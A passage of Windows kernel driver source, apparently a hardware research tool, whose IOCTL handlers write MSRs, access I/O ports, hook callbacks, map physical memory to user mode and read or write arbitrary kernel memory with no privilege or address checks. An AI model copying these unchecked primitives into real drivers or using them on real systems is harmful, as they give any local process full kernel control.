			pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
			KeInitializeDpc(pkdpc, WriteMsrForCoreCallback, NULL);
			KeSetTargetProcessorDpc(pkdpc, Buffer->core_id);

			// Schedule on core N
			KeInsertQueueDpc(pkdpc, Buffer, NULL);

			// Wait until core 0 finishes function
			while (InterlockedCompareExchange(&WriteMsrForCoreExecuted, 1, 1) != 1);
			
			// Free resources
			ExFreePool(pkdpc);

			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			
		}
		
	}
	return Status;
}



NTSTATUS ReadIOPort(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(IO_PORT_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(IO_PORT_CALL)) {
			PIO_PORT_CALL p = (PIO_PORT_CALL)Irp->AssociatedIrp.SystemBuffer;
			
			switch(p->size) {
				case IO_SIZE_BYTE:
					p->data = __inbyte(p->port);
					break;
				case IO_SIZE_WORD:
					p->data = __inword(p->port);
					break;
				case IO_SIZE_DWORD:
					p->data = __indword(p->port);
					break;
				default:
					Irp->IoStatus.Information = 0;
					return STATUS_INVALID_PARAMETER;
			}
			Irp->IoStatus.Information = sizeof(IO_PORT_CALL);
			Status = STATUS_SUCCESS;
		}
	}
	return Status;
}

NTSTATUS WriteIOPort(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(IO_PORT_CALL)) {
		PIO_PORT_CALL p = (PIO_PORT_CALL)Irp->AssociatedIrp.SystemBuffer;
		__try {
			switch(p->size) {
				case IO_SIZE_BYTE:
					__outbyte(p->port, p->data);
					break;
				case IO_SIZE_WORD:
					__outword(p->port, p->data);
					break;
				case IO_SIZE_DWORD:
					__outdword(p->port, p->data);
					break;
				default:
					return STATUS_INVALID_PARAMETER;
			}
			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			Status = STATUS_UNSUCCESSFUL;
		}	
	}
	return Status;
}

NTSTATUS PatchCallback(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(PATCH_CALLBACK) 
		&& IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(PVOID) ) 
	{
		__try {
			PVOID hookCbAddress = CreateCbHook((PPATCH_CALLBACK)Irp->AssociatedIrp.SystemBuffer);
			if (hookCbAddress != NULL) {
				*((PVOID *)Irp->AssociatedIrp.SystemBuffer) = hookCbAddress;
				Irp->IoStatus.Information = sizeof(PVOID);
				Status = STATUS_SUCCESS;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {

		}

	}
	return Status;
}

NTSTATUS RestoreCallback(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(RESTORE_CALLBACK))
	{
		__try {
			RemoveCbHook((PRESTORE_CALLBACK)Irp->AssociatedIrp.SystemBuffer);			
			Status = STATUS_SUCCESS;			
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
		}
	}
	return Status;
}

NTSTATUS RemoveAllCallbackHooks(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status;
	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	RemoveAllCbHooks();
	return STATUS_SUCCESS;
}




NTSTATUS MapPhysicalMemory(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;
	PVOID user_addr;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(MAP_PHYSICAL_MEM_CALL)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength == sizeof(PVOID)) {

			PMAP_PHYSICAL_MEM_CALL p = (PMAP_PHYSICAL_MEM_CALL)Irp->AssociatedIrp.SystemBuffer;
			PVOID va = MmMapIoSpace(p->phys_address, PAGE_SIZE, MmNonCached);
			
			if (va) {
				PMDL mdl = IoAllocateMdl(va, PAGE_SIZE, FALSE, FALSE,  NULL);

				if (!mdl) {
					DbgPrint("[-] MapPhysicalMemory: IoAllocateMdl failed\n");
					MmUnmapIoSpace(va, PAGE_SIZE);
					goto exit;
				}

				__try
				{
					// lock allocated MDL pages
					MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);

					user_addr = MmMapLockedPagesSpecifyCache(
						mdl,
						UserMode,
						MmNonCached,
						NULL,
						TRUE,
						NormalPagePriority
					);

				}
				__except (EXCEPTION_EXECUTE_HANDLER)
				{
					DbgPrint("[-] MapPhysicalMemory: MmProbeAndLockPages failed\n");
					IoFreeMdl(mdl);
					MmUnmapIoSpace(va, PAGE_SIZE);
					goto exit;
				}
				
				USER_MAPPED_MEM *new_mapping = (USER_MAPPED_MEM*)ExAllocatePool(NonPagedPool, sizeof(USER_MAPPED_MEM));

				new_mapping->phys_address = p->phys_address;
				new_mapping->kernel_va = va;
				new_mapping->mdl = mdl;
				new_mapping->is_allocation = FALSE;
				new_mapping->user_address = user_addr;					
				new_mapping->next = g_root_user_mapped_mem;
				g_root_user_mapped_mem = new_mapping;
				
				*((PVOID *)Irp->AssociatedIrp.SystemBuffer) = user_addr;

				Irp->IoStatus.Information = sizeof(PVOID);
				Status = STATUS_SUCCESS;

				DbgPrint("[-] MapPhysicalMemory: successfully mapped %lx to %lx (User)\n",
					p->phys_address, user_addr);
				
			}
			else {
				DbgPrint("[-] MapPhysicalMemory: MmapIoSpace failed\n");
			}
		}
	}
exit:
	return Status;
}



NTSTATUS UnmapPhysicalMemory(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(UNMAP_PHYSICAL_MEM_CALL)) {
		
		PUNMAP_PHYSICAL_MEM_CALL p = (PUNMAP_PHYSICAL_MEM_CALL)Irp->AssociatedIrp.SystemBuffer;

		if (g_root_user_mapped_mem != NULL) {
			USER_MAPPED_MEM *curr = g_root_user_mapped_mem;
			USER_MAPPED_MEM *prev = curr;
			while (curr != NULL && curr->user_address != p->user_address) {
				prev = curr;
				curr = curr->next;
			}

			if (curr && curr->user_address == p->user_address) {
				
				MmUnmapLockedPages(curr->user_address, curr->mdl);
				MmUnlockPages(curr->mdl);
				IoFreeMdl(curr->mdl);
				if (curr->is_allocation == TRUE) {
					ExFreePool(curr->kernel_va);
				}
				else {
					MmUnmapIoSpace(curr->kernel_va, PAGE_SIZE);
				}
				
				
				if (prev == curr) {
					if (curr->next == NULL) {
						g_root_user_mapped_mem = NULL;
					}
					else {
						g_root_user_mapped_mem = curr->next;
					}
				}
				prev->next = curr->next;
				ExFreePool(curr);
			}
		}

		Status = STATUS_SUCCESS;
		
	}

	return Status;
}

NTSTATUS AllocateUserMemory(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	PVOID user_addr;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength == sizeof(UINT32)) {
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength == sizeof(struct alloc_user_physmem)) {
			
			UINT32 bufferSize = *(UINT32 *) Irp->AssociatedIrp.SystemBuffer;


			PVOID mem = ExAllocatePool(NonPagedPool, bufferSize);
			if (!mem) {
				goto exit;
			}

			PMDL mdl = IoAllocateMdl(mem, bufferSize, FALSE, FALSE, NULL);

			if (!mdl) {
				ExFreePool(mem);
				goto exit;
			}

			__try
			{
				// lock allocated MDL pages
				MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);

				// This should not fail
				user_addr = MmMapLockedPagesSpecifyCache(
					mdl,
					UserMode,
					MmCached,
					NULL,
					FALSE,
					NormalPagePriority
				);

			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{
				IoFreeMdl(mdl);
				ExFreePool(mem);
				goto exit;
			}

			USER_MAPPED_MEM* new_mapping = (USER_MAPPED_MEM*)ExAllocatePool(NonPagedPool, sizeof(USER_MAPPED_MEM));

			new_mapping->phys_address.QuadPart = 0;
			new_mapping->kernel_va = mem;
			new_mapping->mdl = mdl;
			new_mapping->is_allocation = TRUE;
			new_mapping->user_address = user_addr;
			new_mapping->next = g_root_user_mapped_mem;
			g_root_user_mapped_mem = new_mapping;

			struct alloc_user_physmem *res = (struct alloc_user_physmem *) Irp->AssociatedIrp.SystemBuffer;
			res->va = user_addr;

			PHYSICAL_ADDRESS physaddr = MmGetPhysicalAddress(user_addr);
			res->pa = physaddr.QuadPart;

			res->size = bufferSize;

			Irp->IoStatus.Information = sizeof(struct alloc_user_physmem);
			Status = STATUS_SUCCESS;


		}
	}

exit:
	return Status;
}



NTSTATUS ReadKMem(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	UINT64 vaddr = 0;
	UINT32 size  = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_KMEM_IN))
	{
		PREAD_KMEM_IN kmem_read = (PREAD_KMEM_IN)Irp->AssociatedIrp.SystemBuffer;
		vaddr = kmem_read->vaddr;
		size =  kmem_read->size;

		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= size) {
			
			__try {				
				memcpy(Irp->AssociatedIrp.SystemBuffer, vaddr, size);

				Irp->IoStatus.Information = size;
				Status = STATUS_SUCCESS;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				DbgPrint("[-] ReadKMem: error reading va:[%016llx] for size:[%08x]\n", vaddr, size);
			}
		}	
	}

exit:
	return Status;
}


NTSTATUS WriteKMem(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_KMEM_IN))
	{
		PWRITE_KMEM_IN kmem_write = (PWRITE_KMEM_IN)Irp->AssociatedIrp.SystemBuffer;

		UINT64 target_vaddr  = kmem_write->target_vaddr;
		UINT64 *source_vaddr = kmem_write->src_vaddr;
		UINT64 size          = kmem_write->size;

		__try {
			//__debugbreak();
			memcpy((void *) target_vaddr,  (void *) source_vaddr, size);
			Status = STATUS_SUCCESS;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			DbgPrint("[-] WriteKMem: error writing va:[%016llx] for size:[%08x]\n", target_vaddr, size);
		}
		
	}

exit:
	return Status;
}


NTSTATUS GetPhysicalMemoryRanges(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(UINT32)) {
		
		PPHYSICAL_MEMORY_RANGE pRanges = MmGetPhysicalMemoryRanges();
			PPHYSICAL_MEMORY_RANGE pCur = pRanges;

		int idx = 0;
		for (; ; idx++) {
			UINT64 base_addr = pRanges[idx].BaseAddress.QuadPart;
				UINT64 count = pRanges[idx].NumberOfBytes.QuadPart;
				if (!base_addr || !count)
					break;
		}

		UINT32 requiredSize = idx * sizeof(PHYSICAL_MEMORY_RANGE);
		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= requiredSize) {
			memcpy(Irp->AssociatedIrp.SystemBuffer, pRanges, requiredSize);
			Irp->IoStatus.Information = requiredSize;
			Status = STATUS_SUCCESS;
		}
		else {
			*(UINT32*)(Irp->AssociatedIrp.SystemBuffer) = requiredSize;
			Irp->IoStatus.Information = sizeof(UINT32);
			Status = STATUS_SUCCESS;
		}

		ExFreePool(pRanges);


	}
	

exit:
	return Status;
}


NTSTATUS IoctlGetPhysicalAddress(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(UINT64) &&
		IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(UINT64)) {

		UINT64 va = *(UINT64*)Irp->AssociatedIrp.SystemBuffer;
		UINT64 pa = (UINT64) GetPhysicalAddress((PVOID) va).QuadPart;

		*(UINT64 *)Irp->AssociatedIrp.SystemBuffer = pa;

		Irp->IoStatus.Information = sizeof(UINT64);
		Status = STATUS_SUCCESS;
	}


exit:
	return Status;
}


NTSTATUS IoctlIndexIO(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	UNREFERENCED_PARAMETER(Irp);
	PAGED_CODE();

	Irp->IoStatus.Information = 0;

	if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(IO_PORT_INDEX_CALL) &&
		IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(IO_PORT_INDEX_CALL)) {

		PIO_PORT_INDEX_CALL p = (PIO_PORT_INDEX_CALL)Irp->AssociatedIrp.SystemBuffer;
	
		switch (p->operation) {
			case INDEX_IO_BYTE_READ_BYTE:
				// Write Index to CMD Port
				__outbyte(p->cmd_port, p->index);
				// Read from DATA port
				p->data = __inbyte(p->data_port);
				break;
			case INDEX_IO_WORD_READ_BYTE:
				__outword(p->cmd_port, p->index);
				p->data = __inbyte(p->data_port);
				break;
			case INDEX_IO_BYTE_READ_WORD:
				__outbyte(p->cmd_port, p->index);
				p->data = __inword(p->data_port);
				break;
			case INDEX_IO_WORD_READ_WORD:
				__outword(p->cmd_port, p->index);
				p->data = __inword(p->data_port);
				break;			
			case INDEX_IO_BYTE_WRITE_BYTE:
				__outbyte(p->cmd_port, p->index);
				__outbyte(p->data_port, p->data);
				break;
			case INDEX_IO_WORD_WRITE_BYTE:
				__outword(p->cmd_port, p->index);
				__outbyte(p->data_port, p->data);
				break;
			case INDEX_IO_BYTE_WRITE_WORD:
				__outbyte(p->cmd_port, p->index);
				__outword(p->data_port, p->data);
				break;
			case INDEX_IO_WORD_WRITE_WORD:
				__outword(p->cmd_port, p->index);
				__outword(p->data_port, p->data);
				break;
			default:
				Irp->IoStatus.Information = 0;
				return STATUS_INVALID_PARAMETER;
			}

		Irp->IoStatus.Information = sizeof(IO_PORT_INDEX_CALL);
		Status = STATUS_SUCCESS;		
	}


exit:
	return Status;
}





#pragma auto_inline()